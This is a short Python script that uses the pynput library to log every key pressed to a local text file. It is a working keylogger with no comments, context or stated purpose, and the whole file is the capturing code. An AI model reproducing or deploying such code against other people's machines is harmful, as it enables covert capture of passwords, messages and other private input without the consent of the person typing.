from pynput.keyboard import Key, Listener
import logging

logdir = ""
logging.basicConfig(filename = "logfile.txt", level = logging.DEBUG, format = '%(message)s')

def keypress(Key):
    logging.info(str(Key))

with Listener(on_press = keypress) as listener:
    listener.join()
